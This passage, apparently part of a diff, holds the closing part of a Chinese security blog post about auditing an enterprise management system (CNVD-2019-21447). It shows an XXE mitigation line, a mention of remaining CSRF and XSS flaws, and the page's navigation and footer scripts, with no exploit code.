+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./3.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>成功偷到数据。</p>
+<p>暂时的防御办法就是：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">libxml_disable_entity_loader</span>(<span class="hljs-variable"><span class="hljs-literal">true</span></span>);</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="4-其他"><a href="#4-其他" class="headerlink" title="4@ 其他"></a>4@ 其他</h1><p>此系统还存在前后台的 csrf 漏洞，xss漏洞，有兴趣可自行审计。</p>
+<p>Refererece：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnvd.org.cn<span class="hljs-regexp">/flaw/</span>show/CNVD-<span class="hljs-number">2019</span>-<span class="hljs-number">21447</span><br></code></pre></td></tr></table></figure>
+
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>rt</li>
+    <li><strong>本文链接：</strong><a href="https://rt-95.github.io/2019/10/06/%E6%9F%90%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93/index.html" title="https:&#x2F;&#x2F;rt-95.github.io&#x2F;2019&#x2F;10&#x2F;06&#x2F;%E6%9F%90%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93&#x2F;index.html">https:&#x2F;&#x2F;rt-95.github.io&#x2F;2019&#x2F;10&#x2F;06&#x2F;%E6%9F%90%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+        
+  <nav class="nav">
+    <a href="/2020/12/10/Go%20%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%94%E8%AE%B0/"><i class="iconfont iconleft"></i>Go 语言知识点笔记</a>
+    <a href="/2019/09/18/deepin%20%E4%B8%8A%E5%A4%9A%E7%89%88%E6%9C%AC%20php%20%E7%89%88%E6%9C%AC%E7%9A%84%E9%85%8D%E7%BD%AE/">deepin 上多版本 php 版本的配置<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+<div id="valine"></div>
+<script defer src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  window.onload = function () {
+    var loadValine = function () {
+      new Valine({
+        el: '#valine',
+        app_id: "2p9C8apOcLBToxgiqqnJtF5v-gzGzoHsz",
+        app_key: "r9A7GDDCd5SSLNdlcwqxdjvR",
+        placeholder: "说点什么吧",
+        avatar: "mp",
+        pageSize: "10",
+        lang: "zh-CN",
+      });
+    }
+    if ( true ) {
+      $("#comments-btn").on("click", function () {
+        $(this).hide();
+        loadValine();
+      });
+    } else {
+      loadValine();
+    }
+  };
+</script>
+
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%89%8D%E8%A8%80"><span class="toc-text">1@ 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-CNVD-2019-21447-%E5%89%8D%E5%8F%B0-sql-%E6%B3%A8%E5%85%A5"><span class="toc-text">2@ CNVD-2019-21447 前台 sql 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%89%8D%E5%8F%B0-xxe"><span class="toc-text">3@ 前台 xxe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E5%85%B6%E4%BB%96"><span class="toc-text">4@ 其他</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="https://github.com/59lx "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="https://weibo.com/u/6479214985 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#00cc99" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconweibo"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">rt</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
